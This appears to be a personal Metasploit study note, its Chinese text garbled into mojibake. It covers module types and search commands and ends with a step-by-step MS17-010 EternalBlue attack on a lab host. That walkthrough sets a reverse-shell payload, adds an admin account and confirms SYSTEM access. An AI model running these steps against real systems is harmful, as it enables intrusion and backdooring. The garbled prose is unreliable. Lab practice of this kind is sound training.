æµ‹è¯•æ¸—é€å¹³å°ï¼›æŸ¥æ‰¾ï¼Œåˆ©ç”¨å’ŒéªŒè¯æ¼æ´
æ”»å‡»å·¥å…·å¼€å‘å¹³å°
https://www.metasploit.com

æ¨¡å—ï¼š
AUX è¾…åŠ©æ¨¡å—
Exploit æ¸—é€æ”»å‡»æ¨¡å—
Post  åæ¸—é€æ”»å‡»æ¨¡å—
payloads  æ”»å‡»è½½è·æ¨¡å—
  ç›®æ ‡æœºå’Œæ”»å‡»æœºç¨³å®šè¿æ¥ï¼Œå¯è¿”å›shellï¼Œä¹Ÿå¯ä»¥ç¨‹åºæ³¨å…¥
Encoders  ç¼–ç å™¨æ¨¡å—
Nops  ç©ºæŒ‡ä»¤æ¨¡å—

â”Œâ”€â”€(rootğŸ’€kali-linux-2021-3)-[/usr/share/metasploit-framework]
â””â”€# ls

#####metasploitable2 é¶æœº
https://sourceforge.net/projects/metasploitable/

ç”¨æˆ·åï¼šmsfadmin
å¯†ç ï¼šmsfadmin

ä¿®æ”¹é™æ€IPåœ°å€
vim /etc/network/interfaces
æ”¹ä¸ºé™æ€IP
auto eth0
iface eth0 inet static
address 192.168.1.180
netmask 255.255.255.0
gateway 192.168.1.0

/etc /init.d/networking restart
#system restart networking

####metasploitåŸºæœ¬ä½¿ç”¨
éœ€è¦ä½¿ç”¨Postgresqlæ•°æ®åº“
  è‡ªç”±è½¯ä»¶-å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ
https://www.postgresql.org
kalié»˜è®¤å·²ç»é›†æˆ

Postgresqlå’ŒMySQL
  postgresqlé€‚åˆé‡‘èã€ç”µä¿¡ã€ERPã€CRMç­‰
  MySQLé€‚åˆäº’è”ç½‘
# systemctl start postgresql 
# systemctl enable postgresql

08æ¼æ´åˆ©ç”¨å·¥å…·é›†
#msfconsole å‘½ä»¤è¡Œå¯åŠ¨

å¸®åŠ©
help

æ ¸å¿ƒå‘½ä»¤
connect
è¿œç¨‹è¿æ¥ä¸»æœºï¼Œä¸€èˆ¬ç”¨äºå†…ç½‘è¯•æ¢
msf6 > connect 10.211.55.1 80

msf6 > connect flyint.cc 80
è¿æ¥

get /
æŸ¥çœ‹æœåŠ¡å™¨ä¿¡æ¯

rankçº§åˆ«
  excellent
  great
  good
  normal
  average
  low
  manual

[*] Connected to flyint.cc:80 (via: 10.211.55.6:41049)
HTTP/1.1 400 Bad Request
Server: cloudflare
Date: Fri, 27 May 2022 06:58:56 GMT
Content-Type: text/html
Content-Length: 155
Connection: close
CF-RAY: -

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>cloudflare</center>
</body>
</html>

1.æ¨¡å—æŸ¥çœ‹å‘½ä»¤ show
msf6 > show exploits
æ˜¾ç¤ºæ¨¡å—åˆ—è¡¨

msf6 > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites

2.##æŒ‰åç§°è¿›è¡ŒæŸ¥æ‰¾
æ¨¡å—ç›¸å…³å‘½ä»¤searchæœç´¢ä½¿ç”¨æ–¹æ³•
msf6 > search name:mysql

search ms08_067

##æŒ‰è·¯å¾„è¿›è¡ŒæŸ¥æ‰¾
msf6 > search path:/windows

3.å¹³å°æŸ¥æ‰¾ï¼Œç¼©å°æŸ¥æ‰¾èŒƒå›´ platform
æ›´ç²¾ç¡®ï¼ŒæŸ¥æ‰¾çš„çº§åˆ«æ›´é«˜
msf6 > search platform:mysql
msf6 > search platform:windows

4.é€šè¿‡ç±»å‹æŸ¥æ‰¾
type:(encodersç¼–ç å™¨, nopsç©ºæŒ‡ä»¤, exploitæ¸—é€æ”»å‡», payloadsæ”»å‡»è½½è·, auxiliaryè¾…åŠ©æ¨¡å—, poståæ¸—é€æ”»å‡», plugins, info, options, favorites)
msf6 > search type:exploit

5.è”åˆæœç´¢
msf6 > search type:exploit platform:mysql
msf6 > search type:auxiliary platform:mysql
#platformå¯èƒ½æœä¸åˆ°ï¼Œæ¢name

MySQL yaSSL CertDecoder::GetName Buffer Overflow
ç¼“å†²åŒºæº¢å‡ºæ¼æ´

6.æ ¹æ®cveæœç´¢exploit
CVE å…¬å…±æ¼æ´å’Œæš´éœ²ï¼›å¹¿æ³›æš´éœ²çš„å¼±ç‚¹
æŸ¥æ‰¾CVE-2017-8464è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´

msf6 > search cve:CVE-2017-8464

msf6 > search Disclosure Date:2018 platform:linux

###########useä½¿ç”¨æ–¹æ³•
use æ¨¡å—å
ms08_067  winxpæ¼æ´
msf6 > search ms08_067
ç›´æ¥æœç´¢ï¼Œä¸ç”¨åŠ name:

è£…è½½æ¸—é€æ”»å‡»æ¨¡å—
msf6 > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > 
è£…è½½æˆåŠŸ

é€€å‡º
msf6 exploit(windows/smb/ms08_067_netapi) > back
msf6 > 
ä¸è¦è¾“å…¥exit

info
æŸ¥çœ‹æ¨¡å—æ˜¯å¹²å˜›çš„
msf6 > info exploit/windows/smb/ms08_067_netapi

msf6 exploit(windows/smb/ms08_067_netapi) >info
è¿›å…¥åinfoä¹Ÿå¯ä»¥


##################â€”â€”â€”â€”â€”â€”ã€‹å®ä¾‹ï¼Œæ°¸æ’ä¹‹è“
winçš„SMBæ¼æ´ï¼Œæ”»å‡»445ï¼Œè·å–ä¸»æœºæœ€é«˜æƒé™ï¼›å¼€æœºä¸Šç½‘å°±èƒ½ç”¨

ms17-010 æ¼æ´

æ•´ä½“ä½¿ç”¨æµç¨‹ï¼š
æŸ¥æ‰¾æ¨¡å—
  search
é…ç½®ç¨‹åº
  æ˜¾ç¤ºå‚æ•°
    show option
    show target
    show encoders
    show advanced
  è®¾ç½®å‚æ•°
    use XXX ï¼ˆexploitï¼‰
    set XXXï¼ˆåˆ©ç”¨show optionsï¼‰ï¼ˆpayloadï¼‰
    set XXX XXXï¼ˆå‚æ•°ï¼‰
exploit
  æ‰§è¡Œ
  exploitï¼ˆå‘½ä»¤ï¼‰
  run


æ•´ä½“ä½¿ç”¨æµç¨‹ï¼š
æŸ¥æ‰¾æ¨¡å—
  search
    msf6 > search ms17-010
é…ç½®ç¨‹åº
  æ˜¾ç¤ºå‚æ•°
    show option
    show target
    show encoders
    show advanced
  è®¾ç½®å‚æ•°
    use XXX ï¼ˆexploitï¼‰
      msf6 > use auxiliary/scanner/smb/smb_ms17_010
      å…ˆä½¿ç”¨scanæ‰«ææ¨¡å—æ£€æŸ¥æ˜¯å¦èƒ½ç”¨ï¼Œå†æ”»å‡»
      msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
    set XXXï¼ˆåˆ©ç”¨show optionï¼‰ï¼ˆpayloadï¼‰
      msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.56
      RHOSTS => 192.168.1.56
      msf6 auxiliary(scanner/smb/smb_ms17_010) > show options      
    set XXX XXXï¼ˆå‚æ•°ï¼‰
exploit
  æ‰§è¡Œ
  exploitï¼ˆå‘½ä»¤ï¼‰
  run
    msf6 auxiliary(scanner/smb/smb_ms17_010) >run
    show targets
    æŸ¥çœ‹æ‰§è¡Œç›®æ ‡
   msf6 exploit(windows/smb/ms17_010_eternable) > show targets
   msf6 exploit(windows/smb/ms17_010_eternable) > show options
   æ”»å‡»è½½è·å®ç°è¿æ¥
   msf6 exploit(windows/smb/ms17_010_eternable) > show payloads
   msf6 exploit(windows/smb/ms17_010_eternable) > search windows/x64/shell
   msf6 exploit(windows/smb/ms17_010_eternable) > set payload windows/x64/shell/reverse_tcp
   msf6 exploit(windows/smb/ms17_010_eternable) > show options
   msf6 exploit(windows/smb/ms17_010_eternable) > set LHOST 192.168.1.57
   msf6 exploit(windows/smb/ms17_010_eternable) > show options
   å‚æ•°å…¨éƒ¨ok
   C:\Windows\system32>run
   
   æˆåŠŸåï¼ŒæŒ‰å›è½¦æ˜¾ç¤º
   C:\Windows\system32>
   C:\Windows\system32>net user admin admin /add
   ä¹±ç è§£å†³ï¼Œç¼–ç 
   C:\Windows\system32>chcp 65001
   C:\Windows\system32>net user
   C:\Windows\system32>whoami
   nt authority\system
   æœ€é«˜æƒé™
   ctrl c æ–­å¼€è¿æ¥
   
   msf6 exploit(windows/smb/ms17_010_eternable) > exploit -j
   åå°æ‰§è¡Œ
   msf6 exploit(windows/smb/ms17_010_eternable) > sessions
   æŸ¥çœ‹ä¼šè¯
   msf6 exploit(windows/smb/ms17_010_eternable) > session -i 2
   2æ˜¯sessionsæŸ¥è¯¢çš„ä¼šè¯id
   C:\Windows\system32>background
   åå°æ‰§è¡Œ
   msf6 exploit(windows/smb/ms17_010_eternable) > session -k 2
   æ€æ­»ä¼šè¯
   
   æ€»ç»“
   æŸ¥æ‰¾CVEå…¬å¸ƒçš„æ¼æ´
   æŸ¥æ‰¾å¯¹åº”çš„exploitæ¨¡å—
   é…ç½®æ¨¡å—å‚æ•°
   æ·»åŠ playloadåé—¨
   æ‰§è¡Œexploitå¼€å§‹æ”»å‡»
   
   
   
    
  









































































































